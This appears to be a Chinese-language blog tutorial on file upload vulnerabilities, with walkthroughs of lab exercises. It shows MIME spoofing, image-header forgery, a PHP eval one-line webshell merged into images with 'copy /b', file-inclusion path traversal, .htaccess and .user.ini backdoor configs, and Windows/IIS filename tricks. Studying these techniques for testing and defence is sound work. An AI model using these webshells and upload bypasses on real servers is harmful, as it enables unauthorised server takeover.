
---
layout: post
title: 任意文件上传漏洞
date: 2026-06-21
tags: 文件上传漏洞

---


# 任意文件上传漏洞

## 介绍

大多数网站都有文件上传的接口，但如果在后台开发时并没有对上传的文件进行安全考虑或采用了有缺陷的措施，导致攻击者可以通过一些手段绕过安全措施从而上传一些恶意文件，然后通过该恶意文件的访问来控制整个后台。文件上传是获取webshell来控制服务器最快的方法。

## 测试流程
只要看到有文件上传的地方都可以进行测试，都有可能存在漏洞

![image-20260523224100494](11/image-20260523224100494.png)

## 绕过

![image-20260523224511693](11/image-20260523224511693.png)

## 前端绕过

![image-20260523225343543](11/image-20260523225343543.png)

`onclick="checkFile(this.value)"`当点击提交按钮的时候会自动对文件类型进行校验，我们可以删除这个参数进行提交

校验代码

![image-20260523231506244](11/image-20260523231506244.png)

也可以通过关掉js代码来进行上传

<img src="11/image-20260523225618924.png" alt="image-20260523225618924" style="zoom:50%;" />

或者通过抓包进行修改文件名进行上传 ，在Content-Disposition里面修改

上传成功：

<img src="11/image-20260523230624268.png" alt="image-20260523230624268" style="zoom: 50%;" />

访问文件路径，然后输入密码，就可以完全控制主机了

<img src="11/image-20260523230934743.png" alt="image-20260523230934743" style="zoom: 33%;" />

## MiME类型检查绕过

MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件

用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，其实可以理解为多媒体类型，jpg图片 -- image/jpeg png -- image/png

浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。

每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。

------

常见的MIME类型(通用型)：

超文本标记语言文本 .html text/html

xml文档 .xml text/xml

XHTML文档 .xhtml application/xhtml+xml

普通文本 .txt text/plain

RTF文本 .rtf application/rtf

PDF文档 .pdf application/pdf

Microsoft Word文件 .word application/msword

PNG图像 .png image/png

GIF图形 .gif image/gif

JPEG图形 .jpeg,.jpg image/jpeg

au声音文件 .au audio/basic

MIDI音乐文件 mid,.midi audio/midi,audio/x-midi

RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio

MPEG文件 .mpg,.mpeg video/mpeg

AVI文件 .avi video/x-msvideo

GZIP文件 .gz application/x-gzip

TAR文件 .tar application/x-tar

任意的二进制数据 application/octet-stream

------

<img src="11/image-20260524184506620.png" alt="image-20260524184506620" style="zoom:50%;" />

发现上传的文件有类型限制，我们可以去抓一下包

<img src="11/image-20260524185025490.png" alt="image-20260524185025490" style="zoom:50%;" />

Content-Type中判断我们上传的是**任意的二进制数据**，不满足上传的类型，那么我们把Content-Type改成题目要求的就可以上传成功。

校验代码

```
if(isset($_POST['submit'])){
//     var_dump($_FILES);
    $mime=array('image/jpg','image/jpeg','image/png');//使用了白名单，指定MIME类型,这里只是对MIME类型做了判断。
    $save_path='uploads';//指定在当前目录建立一个目录
    $upload=upload_sick('uploadfile',$mime,$save_path);//调用函数，对文件类型进行校验
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";
    }
}

```

缺点：并没有对文件内容，大小进行校验

[如何使用php进行文件上传](http://www.w3school.com.cn/php/php_file_upload.asp)



## getimagesize函数检擦绕过

getimagesize() 是php的一个函数，用于获取图像大小及相关信息，成功返回一个数组，失败则返回FALSE 并产生一条 E_WARNING 级的错误信息，如果用这个涵数来获取类型，从而判断是否是图片的话，会存在问题。其实这个函数比较难绕过，也就是比较安全的一个函数，绕过它三种方法，但是利用起来还需要一个前提条件，就是对方站点还要有一个文件包含漏洞，才能绕过它，或者修改文件数据的头部数据。

语法格式：

```
array getimagesize ( string $filename [, array &$imageinfo ] )
参数 1 $filename：必须，图片路径 / URL
参数 2 &$imageinfo：可选，引用传参，存扩展信息
getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，
JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸
以及文件类型及图片高度与宽度。
```

png头文件(乱码)

```
塒NG
```

------

jbg图片头文件

![image-20260527224628601](11/image-20260527224628601.png)

------

gif图片头文件

```
GIF89A
```

### 方法1：直接伪造头部GIF89A

GIF89A是gif图片格式的数据开头。  

每种类型的文件，文件数据的开头都是不同的，相同的文件类型，打开之后，文件数据肯定是相同的

而getimagesize() 函数除了检查了文件扩展名，还会检查文件数据，当我们上传了一个非图片文件，然后通过burp改了数据包，改为了图片格式的后缀名，发送包之后，报错了，所以如果php开发人员使用了这个函数，那么我们攻击时，要考虑这个事情。但是，这个函数不是将文件内容全部检查一遍，它检查的就是文件数据中的前面标识文件格式的数据。

示例：

<img src="11/image-20260527225857898.png" alt="image-20260527225857898" style="zoom:50%;" />

上传成功

<img src="11/image-20260527225916812.png" alt="image-20260527225916812" style="zoom:50%;" />

### 方法2：copy方法

准备木马图片：
web2.php
<php @eval($_post['1'];?>

222.jbg
正常图片

一句话木马
vstart50\tools\webshell\一句话木马.txt

合并2个文件
在cmd中（记住文件存放的路径）

```
copy /b 222.jbg web2.php 222.jbg
```

### 方法3：使用转换工具

vstart50/tools/漏洞利用/edjpgcom图片插入一句话工具/edjbg.exe
把你要制作的图片用exe打开，然后写入一句话木马

制作完毕

<img src="11/image-20260528221705613.png" alt="image-20260528221705613" style="zoom: 50%;" />

上传完毕后找到有文件包含漏洞的网页，在这里去加载你上传的木马图片

### 为什么要用文件包含
1.直接访问图片服务器看到 .jpg 后缀，知道这是图片。它会读取文件二进制内容，设置正确的 Content-Type: image/jpeg 头，然后原样返回给浏览器。浏览器就把它当图片显示。PHP 代码在这里不会被解析执行，只会被当作普通图片数据输出。

2.通过文件包含访问，服务器端的 PHP 引擎会把文件内容当作 PHP 脚本代码来解析执行。因此图片里隐藏的 <?php ... ?> 部分会在服务器上被运行，其输出（如果有）才返回给浏览器。

通过蚁剑访问那个包含了木马图片的url



文件包含网页

<img src="11/image-20260528215211766.png" alt="image-20260528215211766" style="zoom:33%;" />

在filename后面通过路径穿越去访问木马文件存放的地方

```
../../unsafeupload/uploads/2026/05/28/8053196a1858c7887fe925640065.jpg
```

出现乱码就算成功

<img src="11/image-20260528215916676.png" alt="image-20260528215916676" style="zoom: 25%;" />

然后拿文件包含网页的url去使用蚁剑

```
http://192.168.179.130/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2026/05/28/1419556a184ceea6cf7352469266.jpg&submit=%E6%8F%90%E4%BA%A4&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

结果如下：

<img src="11/image-20260528231035492.png" alt="image-20260528231035492" style="zoom:50%;" />

## 靶场练习

### 第一关

我们上传一个webshell，发现有alert弹窗，说明可能在前端进行了防护

<img src="12/image-20260607093638371.png" alt="image-20260607093638371" style="zoom:50%;" />

防护函数如下

<img src="12/image-20260607093758593.png" alt="image-20260607093758593" style="zoom:50%;" />

<img src="12/image-20260607093851781.png" alt="image-20260607093851781" style="zoom:50%;" />

我们可以手动把这个函数删掉，或者关掉js代码，或者通过抓包先把后缀改成符合的，然后在bp中修改回去



### 第二关

上传webshell.php没有alert弹窗显示显示这个

<img src="12/image-20260607094511859.png" alt="image-20260607094511859" style="zoom:50%;" />

说明可能不是前端防护，变成了后端，应该是MINE类型的检查，我们通过抓包，对contenttype进行修改即可



### 第三关

先尝试上传各种各样类型的文件，发现asp，aspx，php，jsp的文件不让上传，说明后端可能设置了黑名单，接着尝试对

contenttype进行修改，发现也不成功



`.phtml`文件介绍：

pthml是php混合html的网页文件后缀，属于php脚本文件，和php文件功能完全一致，服务器都可以解析，

在phtml文件中写入`<?php phpinfo()?>`，获取php环境的函数，然后上传

<img src="12/image-20260607100412206.png" alt="image-20260607100412206" style="zoom: 50%;" />

发先多了一个没有任何东西的图片，我们想让文件中的函数执行，就得要让浏览器去解析文件，就需要去访问路径，右击图片选择复制图片链接，然后访问链接就可以了

<img src="12/image-20260607100947248.png" alt="image-20260607100947248" style="zoom:50%;" />

但是这里并没有解析，是因为在apache配置文件`httpd-conf`中` AddType application/x-httpd-php .php .phtml`这个配置被注释了

开启之后就可以正常解析了

<img src="12/image-20260607101259056.png" alt="image-20260607101259056" style="zoom:50%;" />

如果运维人员在测试完成之后没有关掉这个选项，那么.phtml文件就可以被解析（php5，php3也可以进行尝试）



### 第四关

先尝试上传各种各样类型的文件，phtml的文件也不让上传，后端可能设置了黑名单，接着尝试对 contenttype进行修改，发现也不成功

此时我们可以上传图片码，但图片在没有文件包含的情况下是无法进行解析的

#### 法一：

`.htaccess`文件介绍：

.htaccess文件可以覆盖的Apache的总配置文件httpd.conf，从而激活一个新的配置

```
<FilesMatch ""> //留空表示可以给Apache的上传任意类型的文件都可以当成php文件解析
SetHandler application/x-httpd-php
</FilesMatch>
```

前提：

1. 需要在httpd.conf中激活AllowOverride ALL，默认是开启的
2. 上传的文件后端不会改名字，必须是.htaccess才可以

效果如下

<img src="12/image-20260607103805773.png" alt="image-20260607103805773" style="zoom: 33%;" />

然后就可以链接蚁剑

------

`.user.in`也是目录的配置文件，.user.ini就是用户自定义的php.ini，可以利用这个文件来构造后门和隐藏后门。,user,in使用的范围很广，不仅限于Apache服务器，同样适配于Nginx服务器

法一(包含在文件头)：

```
auto_prepend_file = <filename>
```

法二（包含在文件尾）：

```
auto_append_file = <filename>
```

前提：

服务器开启了`fastcgl`（默认开启的）

上传的文件没有被改名，必须是`.user.in`

在当前目录中必须存在一个php文件

php最好在5.3版本以上



实战：

在`.user.in`中写`auto_prepend_file = 111.jpg`,意为把111.jpg文件中的内容加载到存在的php文件中。

在111.jpg文件中写<?php phpinfo();?>

![image-20260612200958971](12/image-20260612200958971.png)

再去访问1.php，结果如下

<img src="12/image-20260612201225796.png" alt="image-20260612201225796" style="zoom: 25%;" />

#### 法二：

前提：

1. 必须是windows2003系统
2. 上传的文件不会改名字 

上传webshell.php并抓包，修改

```
filename="webshell.php:.jpg"
```



```
ContentType:image/png
```

上传到后端会自动变成webshell.php，这是windows2003特有的机制，但是会清空文件，显示0kb

![image-20260607104428064](12/image-20260607104428064.png)

再次上传webshell.php,抓包修改

```
filename=webshell.<<<
```

利用`<`的重定向，把攻击代码写到之前的空文件中

<img src="12/image-20260607105206741.png" alt="image-20260607105206741" style="zoom: 50%;" />

然后访问路径就成功了

#### 法三：

若是iis（windows自带的web服务器）

上传一个`asp.asp;.jpg`文件可以绕过

<img src="12/image-20260607110251196.png" alt="image-20260607110251196" style="zoom: 33%;" />

<img src="12/image-20260607110458147.png" alt="image-20260607110458147" style="zoom:33%;" />

因为windows系统的iis解析文件是从左往右的，看到asp就不会再在解析后面的了



### 第五关

查看源码发现对以下文件进行了过滤：

```
(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
```

发现没有对大小写过滤，那么我就可以尝试上传`webshe.pHP`这样的文件

### 第六关

源代码中没有对空格进行处理，那么我们可以上传`webshell.php.空格`的文件

Windows特性会自动忽略文件名末尾的空格与末尾点，实际识别文件后缀等价.php，直接访问就执行 PHP 木马。

在linux中就不可以

### 第七关

源代码中没有对结尾的`.`进行处理我们可以上传`webshell.php空格.`的文件

### 第八关

`1.txt:stream:$DATA`文件介绍

windows特有的

文件名:流名称:流类型

1.txt：宿主主文件（磁盘上可见的基础文件）

stream：自定义命名的备用数据流（ADS，Alternate Data Stream）

$DATA：NTFS 固定流类型标识，代表存储二进制 / 文本内容的数据属性流

简单概括：在 1.txt 这个文件里，藏了一个名叫 stream 的隐藏附加数据流。

特点：

1. 可独立读写、存放和主文件无关的内容（在1.txt:stream:$DATA）中写的内容，在1.txt中看不见
2. 资源管理器、普通记事本看不到这个（1.txt:stream:$DATA），不会显示大小、内容，只会看到（1.txt）



### 第九关

既对末尾的`.`做了控制也对`空格`做了处理，我们可以上传webshell.php.空格.

### 第十关

`$file_name = str_ireplace($deny_ext,"", $file_name);`

对黑名单里面的后缀进行了替换为空的处理

我们可以通过双写来绕过，`webshell.phphpp`

